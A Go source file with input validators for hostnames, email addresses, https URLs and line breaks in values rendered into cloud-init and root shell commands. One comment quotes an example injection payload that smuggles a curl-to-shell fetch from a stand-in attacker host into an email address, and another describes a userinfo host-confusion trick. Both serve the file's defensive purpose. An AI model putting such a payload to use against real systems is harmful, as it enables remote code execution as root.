// Package validate holds the input checks shared by the components in this
// repository.
//
// These exist because every value they guard is rendered into cloud-init: into a
// YAML block scalar, and in some cases onward into a shell command that runcmd
// executes as root. A line break ends the block early and changes the meaning of
// the document; a shell metacharacter in an unquoted position is worse.
package validate

import (
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
)

// hostnameRe matches a fully qualified domain name: at least two labels, each 1-63
// characters, alphanumeric with interior hyphens only.
var hostnameRe = regexp.MustCompile(
	`(?i)^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$`,
)

// emailLocalRe matches the local part of an email address. It is an allow-list
// rather than a deny-list because the address reaches a shell: rejecting only the
// metacharacters we thought of is how a payload like
// `curl${IFS}evil.example|sh`@x.test gets through.
var emailLocalRe = regexp.MustCompile(`^[A-Za-z0-9._%+-]+$`)

// Hostname rejects anything that is not a fully qualified domain name.
func Hostname(field, hostname string) error {
	if hostname == "" {
		return fmt.Errorf("%s is required", field)
	}
	if len(hostname) > 253 {
		return fmt.Errorf("%s %q is longer than 253 characters", field, hostname)
	}
	if !hostnameRe.MatchString(hostname) {
		return fmt.Errorf("%s %q is not a fully qualified domain name", field, hostname)
	}
	return nil
}

// Email rejects anything that is not a plausible address in a charset safe to
// render into a shell command.
func Email(field, email string) error {
	if email == "" {
		return fmt.Errorf("%s is required", field)
	}
	if strings.ContainsAny(email, " \t\r\n") {
		return fmt.Errorf("%s %q contains whitespace", field, email)
	}

	local, domain, found := strings.Cut(email, "@")
	if !found || local == "" || strings.Contains(domain, "@") {
		return fmt.Errorf("%s %q is not a valid email address", field, email)
	}
	if !emailLocalRe.MatchString(local) {
		return fmt.Errorf("%s %q is not a valid email address", field, email)
	}
	if err := Hostname(field+" domain", domain); err != nil {
		return fmt.Errorf("%s %q has an invalid domain: %w", field, email, err)
	}
	return nil
}

// NoLineBreaks rejects values that would terminate a YAML block scalar early.
func NoLineBreaks(field, value string) error {
	if strings.ContainsAny(value, "\r\n") {
		return fmt.Errorf("%s must not contain line breaks", field)
	}
	return nil
}

// HttpsUrl rejects anything that is not an https URL safe to render as a single
// command-line argument.
//
// Plain http is refused rather than merely discouraged: the values carried over
// this link are authentication tokens, and the endpoint is reached across the
// public internet.
func HttpsUrl(field, value string) error {
	if value == "" {
		return fmt.Errorf("%s is required", field)
	}
	// Whitespace would split it into two arguments rather than one.
	if strings.ContainsAny(value, " \t\r\n") {
		return fmt.Errorf("%s %q contains whitespace", field, value)
	}

	// Parsed rather than pattern-matched, so the host checked here is the host a
	// client will actually connect to. Picking it out with string operations gets
	// this wrong: in https://valid.example:443@not_a_host the text before the "@"
	// is userinfo, and the real host is what follows it.
	u, err := url.Parse(value)
	if err != nil {
		return fmt.Errorf("%s %q is not a valid URL: %w", field, value, err)
	}
	if u.Scheme != "https" {
		return fmt.Errorf("%s %q must be an https:// URL", field, value)
	}
	if u.User != nil {
		return fmt.Errorf("%s %q must not contain credentials", field, value)
	}
	if err := Hostname(field+" host", u.Hostname()); err != nil {
		return fmt.Errorf("%s %q has an invalid host: %w", field, value, err)
	}
	return nil
}

// Required rejects an empty value, after checking it for line breaks.
func Required(field, value string) error {
	if value == "" {
		return errors.New(field + " is required")
	}
	return NoLineBreaks(field, value)
}
